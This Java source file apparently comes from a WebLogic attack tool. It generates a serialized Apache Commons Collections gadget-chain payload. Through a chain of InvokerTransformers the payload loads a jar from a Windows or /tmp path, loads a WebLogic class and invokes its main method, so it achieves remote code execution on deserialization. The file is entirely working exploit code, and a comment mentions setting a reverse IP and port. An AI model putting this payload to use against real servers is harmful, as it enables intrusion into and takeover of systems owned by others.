package payload;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class GenInstallPayload
{
	public static byte[] Gen(String OS) throws Exception
    {
        String Path="file:/c:/windows/temp/test.jar";
        if (!OS.equals("Windows"))
        {
           Path="file:/tmp/test.jar ";
        }
        final Transformer[] transforms = new Transformer[] {
        new ConstantTransformer(java.net.URLClassLoader.class),
        // getConstructor class.class classname
        new InvokerTransformer("getConstructor",
        new Class[] { Class[].class },
        new Object[] { new Class[] { java.net.URL[].class } }),
        new InvokerTransformer(
        "newInstance",
        new Class[] { Object[].class },
        new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
        Path) } } }),
        new InvokerTransformer("loadClass",
        new Class[] { String.class }, new Object[] { "weblogic.jndi.internal.InitAppImpl" }),
        // set the target reverse ip and port
        new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "main", new Class[]{String[].class} }),
        // invoke
        new InvokerTransformer("invoke",new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[]{new String[]{"just for test"}} }) };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        Class cls = Class
        .forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outmap);
        ByteArrayOutputStream bo=new ByteArrayOutputStream(10);
        ObjectOutputStream out = new ObjectOutputStream(bo);
           out.writeObject(instance);
           out.flush();
           out.close();
           return bo.toByteArray();
    }
}
